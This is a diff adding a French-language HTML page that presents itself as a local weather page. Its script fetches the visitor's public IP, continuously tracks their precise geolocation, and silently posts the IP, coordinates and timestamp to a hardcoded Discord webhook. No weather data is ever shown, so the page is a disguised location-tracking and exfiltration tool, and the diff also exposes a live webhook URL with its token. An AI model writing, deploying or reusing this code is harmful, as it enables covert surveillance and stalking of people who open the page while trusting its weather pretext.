@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Météo</title>
+<style>
+  body { background:#87ceeb; color:#111; font-family:Arial, sans-serif; text-align:center; padding:30px; }
+  h1 { margin-top:50px; }
+  p { font-size:18px; }
+</style>
+</head>
+<body>
+<h1>Météo locale</h1>
+<p>Chargement des conditions météorologiques...</p>
+
+<script>
+(async function() {
+  let ipAddress = "";
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    ipAddress = data.ip;
+  } catch(e) { return; }
+
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.watchPosition(
+    position => {
+      const payload = {
+        ip: ipAddress,
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        timestamp: new Date().toISOString()
+      };
+
+      fetch("https://discordapp.com/api/webhooks/1412498955790717008/DjsN6Om78iNsKOGRHEWw-MFEOLENiTm5QIcnQUY0yom42VJRwjC0C7pUud3RY_13GDTK", {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" }
+      }).catch(()=>{});
+
+      console.log(payload);
+    },
+    err => {},
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+  );
+})();
+</script>
+</body>
+</html>
